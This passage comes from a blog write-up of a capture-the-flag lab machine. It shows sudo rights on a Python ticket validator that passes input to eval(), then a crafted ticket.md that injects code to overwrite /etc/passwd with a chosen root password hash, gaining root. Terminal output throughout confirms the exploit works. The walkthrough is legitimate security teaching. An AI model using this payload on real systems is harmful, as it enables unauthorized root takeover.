    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
</code></pre></div><p>There is a file called <code>contract.txt</code> in the home directory. The file tells a little story to end with some reasons for having <code>sudo</code> permissions on the Python script:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">development@bountyhunter</span>:<span class="code-blue">~</span>$ ls -a
<span class="code-blue">.</span>   .bash_history  .bashrc  contract.txt  <span class="code-blue">.local</span>    <span class="code-blue">.ssh</span>      .viminfo  
<span class="code-blue">..</span>  .bash_logout   <span class="code-blue">.cache</span>   .lesshst      .profile  user.txt
<span class="code-green">development@bountyhunter</span>:<span class="code-blue">~</span>$ cat contract.txt
Hey team,

I'll be out of the office this week but please make sure that our
contract with Skytrain Inc gets completed.

This has been our first job since the "rm -rf" incident and we can't
mess this up. Whenever one of you gets on please have a look at the
internal tool they sent over. There have been a handful of tickets
submitted that have been failing validation and I need you to figure
out why.

I set up the permissions for you to test this. Good luck.

-- John
</code></pre></div><p>The Python script is shown below:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#Skytrain Inc Ticket Validation System 0.1</span>
<span class="mtk3">#Do not distribute this file.</span>

<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">load_file</span><span class="mtk1">(</span><span class="mtk9 mtki">loc</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk9 mtki">loc</span><span class="mtk1">.endswith(</span><span class="mtk4">".md"</span><span class="mtk1">):</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk9 mtki">loc</span><span class="mtk1">, </span><span class="mtk4">'r'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk5">else</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk4">"Wrong file type."</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk8">exit</span><span class="mtk1">()</span>

<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">evaluate</span><span class="mtk1">(</span><span class="mtk9 mtki">ticketFile</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk3">#Evaluates a ticket to check for ireggularities.</span>
<span class="mtk1">    </span><span class="mtk1">code_line</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">None</span>
<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1">, </span><span class="mtk1">x</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">enumerate</span><span class="mtk1">(</span><span class="mtk9 mtki">ticketFile</span><span class="mtk1">.readlines()):</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">:</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk5">not</span><span class="mtk1"> </span><span class="mtk1">x</span><span class="mtk1">.startswith(</span><span class="mtk4">"# Skytrain Inc"</span><span class="mtk1">):</span>
<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">False</span>
<span class="mtk1">            </span><span class="mtk5">continue</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">:</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk5">not</span><span class="mtk1"> </span><span class="mtk1">x</span><span class="mtk1">.startswith(</span><span class="mtk4">"## Ticket to "</span><span class="mtk1">):</span>
<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">False</span>
<span class="mtk1">            </span><span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">"Destination: </span><span class="mtk6">{</span><span class="mtk4">' '</span><span class="mtk1">.</span><span class="mtk8">join</span><span class="mtk1">(</span><span class="mtk1">x</span><span class="mtk1">.strip().split(</span><span class="mtk4">' '</span><span class="mtk1">)[</span><span class="mtk6">3</span><span class="mtk1">:])</span><span class="mtk6">}</span><span class="mtk4">"</span><span class="mtk1">)</span>  
<span class="mtk1">            </span><span class="mtk5">continue</span>

<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">x</span><span class="mtk1">.startswith(</span><span class="mtk4">"__Ticket Code:__"</span><span class="mtk1">):</span>
<span class="mtk1">            </span><span class="mtk1">code_line</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk5">+</span><span class="mtk6">1</span>
<span class="mtk1">            </span><span class="mtk5">continue</span>

<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">code_line</span><span class="mtk1"> </span><span class="mtk5">and</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk1">code_line</span><span class="mtk1">:</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk5">not</span><span class="mtk1"> </span><span class="mtk1">x</span><span class="mtk1">.startswith(</span><span class="mtk4">"**"</span><span class="mtk1">):</span>
<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">False</span>
<span class="mtk1">            </span><span class="mtk1">ticketCode</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">x</span><span class="mtk1">.replace(</span><span class="mtk4">"**"</span><span class="mtk1">, </span><span class="mtk4">""</span><span class="mtk1">).split(</span><span class="mtk4">"+"</span><span class="mtk1">)[</span><span class="mtk6">0</span><span class="mtk1">]</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">ticketCode</span><span class="mtk1">) </span><span class="mtk5">%</span><span class="mtk1"> </span><span class="mtk6">7</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">4</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk1">validationNumber</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">eval</span><span class="mtk1">(</span><span class="mtk1">x</span><span class="mtk1">.replace(</span><span class="mtk4">"**"</span><span class="mtk1">, </span><span class="mtk4">""</span><span class="mtk1">))</span>
<span class="mtk1">                </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">validationNumber</span><span class="mtk1"> </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk6">100</span><span class="mtk1">:</span>
<span class="mtk1">                    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">True</span>
<span class="mtk1">                </span><span class="mtk5">else</span><span class="mtk1">:</span>
<span class="mtk1">                    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">False</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">False</span>

<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk1">fileName</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">input</span><span class="mtk1">(</span><span class="mtk4">"Please enter the path to the ticket file.</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">ticket</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">load_file</span><span class="mtk1">(</span><span class="mtk1">fileName</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk3">#DEBUG print(ticket)</span>
<span class="mtk1">    </span><span class="mtk1">result</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">evaluate</span><span class="mtk1">(</span><span class="mtk1">ticket</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">(result)</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk4">"Valid ticket."</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk5">else</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk4">"Invalid ticket."</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">ticket</span><span class="mtk1">.</span><span class="mtk8">close</span>

<span class="mtk8">main</span><span class="mtk1">()</span>
</code></pre></div><h2 id="privilege-escalation">Privilege escalation</h2><p>The code smell of this script is the use of the <code>eval()</code> function, which is an unsafe function and is not recommended. With this function, we can get arbitrary code execution as <code>root</code> (because we have <code>sudo</code> permissions) performing a command injection in Python language.</p><p>In this situation, there are a lot of alternatives to gain access as <code>root</code>. This time, we will be modifying the password for the <code>root</code> user in <code>/etc/passwd</code>. For example, we can use the following password and encrypt it with <code>openssl</code> (DES Unix format):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">openssl</span> passwd rocky  
JyHhfPjiAYUB2
</code></pre></div><p>We can make use of the <code>open()</code> built-in function to read files and write into them as <code>root</code>. The idea is to enter the password in <code>/etc/passwd</code> for the <code>root</code> user. Just as follows:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">- root:x:0:0:root:/root:/bin/bash</span>
<span class="mtk8">+ root:JyHhfPjiAYUB2:0:0:root:/root:/bin/bash</span>  
</code></pre></div><p>Taking a look at the code, it is reading from a MarkDown file (ticket) and doing some validations. The first is:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1">, </span><span class="mtk1">x</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">enumerate</span><span class="mtk1">(</span><span class="mtk9 mtki">ticketFile</span><span class="mtk1">.readlines()):</span>  
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">:</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk5">not</span><span class="mtk1"> </span><span class="mtk1">x</span><span class="mtk1">.startswith(</span><span class="mtk4">"# Skytrain Inc"</span><span class="mtk1">):</span>
<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">False</span>
<span class="mtk1">            </span><span class="mtk5">continue</span>
</code></pre></div><p>So the first line must be <code># Skytrain Inc</code>. There is another validation:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">:</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk5">not</span><span class="mtk1"> </span><span class="mtk1">x</span><span class="mtk1">.startswith(</span><span class="mtk4">"## Ticket to "</span><span class="mtk1">):</span>
<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">False</span>
<span class="mtk1">            </span><span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">"Destination: </span><span class="mtk6">{</span><span class="mtk4">' '</span><span class="mtk1">.</span><span class="mtk8">join</span><span class="mtk1">(</span><span class="mtk1">x</span><span class="mtk1">.strip().split(</span><span class="mtk4">' '</span><span class="mtk1">)[</span><span class="mtk6">3</span><span class="mtk1">:])</span><span class="mtk6">}</span><span class="mtk4">"</span><span class="mtk1">)</span>  
<span class="mtk1">            </span><span class="mtk5">continue</span>
</code></pre></div><p>The program expects a specific second line, so the file must have <code>## Ticket to</code> as second line.</p><p>And then, to be able to enter Python code, we need to add another line, because there is another validation:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">x</span><span class="mtk1">.startswith(</span><span class="mtk4">"__Ticket Code:__"</span><span class="mtk1">):</span>
<span class="mtk1">            </span><span class="mtk1">code_line</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk5">+</span><span class="mtk6">1</span>
<span class="mtk1">            </span><span class="mtk5">continue</span>

<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">code_line</span><span class="mtk1"> </span><span class="mtk5">and</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk1">code_line</span><span class="mtk1">:</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk5">not</span><span class="mtk1"> </span><span class="mtk1">x</span><span class="mtk1">.startswith(</span><span class="mtk4">"**"</span><span class="mtk1">):</span>
<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">False</span>
<span class="mtk1">            </span><span class="mtk1">ticketCode</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">x</span><span class="mtk1">.replace(</span><span class="mtk4">"**"</span><span class="mtk1">, </span><span class="mtk4">""</span><span class="mtk1">).split(</span><span class="mtk4">"+"</span><span class="mtk1">)[</span><span class="mtk6">0</span><span class="mtk1">]</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">ticketCode</span><span class="mtk1">) </span><span class="mtk5">%</span><span class="mtk1"> </span><span class="mtk6">7</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">4</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk1">validationNumber</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">eval</span><span class="mtk1">(</span><span class="mtk1">x</span><span class="mtk1">.replace(</span><span class="mtk4">"**"</span><span class="mtk1">, </span><span class="mtk4">""</span><span class="mtk1">))</span>  
<span class="mtk1">                </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">validationNumber</span><span class="mtk1"> </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk6">100</span><span class="mtk1">:</span>
<span class="mtk1">                    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">True</span>
<span class="mtk1">                </span><span class="mtk5">else</span><span class="mtk1">:</span>
<span class="mtk1">                    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">False</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">False</span>
</code></pre></div><p>As it is shown, another required line is <code>__Ticket Code:__</code>.</p><p>And finally, the <code>ticketCode</code> variable must be a number that has a remainder of <code>4</code> when it is divided by <code>7</code> (for example: <code>4</code>, <code>11</code>, <code>18</code> or <code>-3</code>). This <code>ticketCode</code> must be followed by a <code>+</code> sign and then the code that will go directly to <code>eval()</code>.</p><p>Now we need to create a valid <code>ticket.md</code> in order to execute code with the <code>eval()</code> function. A possible one is:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk8 mtkb"># Skytrain Inc</span>
<span class="mtk8 mtkb">## Ticket to 7Rocky</span>
<span class="mtk7 mtkb">__Ticket Code:__</span>
<span class="mtk7 mtkb">**4+open('/etc/passwd', 'w').write('root:JyHhfPjiA</span><span class="mtk7 mtkb">YUB2' + open('/tmp/passwd').read()[</span><span class="mtk6 mtkb">6:</span><span class="mtk7 mtkb">])**</span>  
</code></pre></div><p>The injected Python code is:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk4">'/etc/passwd'</span><span class="mtk1">, </span><span class="mtk4">'w'</span><span class="mtk1">).</span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk4">'root:JyHhfPjiAYUB2'</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk4">'/tmp/passwd'</span><span class="mtk1">).</span><span class="mtk8">read</span><span class="mtk1">()[</span><span class="mtk6">6</span><span class="mtk1">:])</span>  
</code></pre></div><p>To make this code work, we need to backup the <code>/etc/passwd</code> file to <code>/tmp/passwd</code>. The use <code>[6:]</code> is to get all the content of the <code>/tmp/passwd</code> except for the first 6 characters, which corresponds exactly to <code>root:x</code>.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">development@bountyhunter</span>:<span class="code-blue">~</span>$ cp /etc/passwd /tmp/passwd  
<span class="code-green">development@bountyhunter</span>:<span class="code-blue">~</span>$ head -1 /tmp/passwd
root:x:0:0:root:/root:/bin/bash
<span class="code-green">development@bountyhunter</span>:<span class="code-blue">~</span>$ head -1 /etc/passwd
root:x:0:0:root:/root:/bin/bash
</code></pre></div><p>Now we execute the script and specify the <code>ticket.md</code> file where it is located. As shown, the <code>root</code> password has changed:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">development@bountyhunter</span>:<span class="code-blue">~</span>$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py  
Please enter the path to the ticket file.
ticket.md
Destination: 7Rocky
Valid ticket.
<span class="code-green">development@bountyhunter</span>:<span class="code-blue">~</span>$ head -1 /etc/passwd
root:JyHhfPjiAYUB2:0:0:root:/root:/bin/bash
</code></pre></div><p>Now we can login as <code>root</code> because we have the password:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">development@bountyhunter</span>:<span class="code-blue">~</span>$ su root
Password:
root@bountyhunter:/home/development# cat /root/root.txt  
5d5a6aae768dd80352e1cefa556aac3f
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#enumeration">Enumeration</a></li><li><a href="#foothold">Foothold</a><ul><li><a href="#exploiting-an-xxe">Exploiting an XXE</a></li><li><a href="#finding-a-password">Finding a password</a></li></ul></li><li><a href="#system-enumeration">System enumeration</a></li><li><a href="#privilege-escalation">Privilege escalation</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit='return window.open("https://tinyletter.com/7Rocky","popupwindow","scrollbars=yes,width=800,height=600"),!0'><h3 class="tc">Receive a weekly blog digest</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Enter your email address" name="email" id="tlemail"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc">powered by <a href="https://tinyletter.com" target="_blank" title="tiniletter">TinyLetter</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2023</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>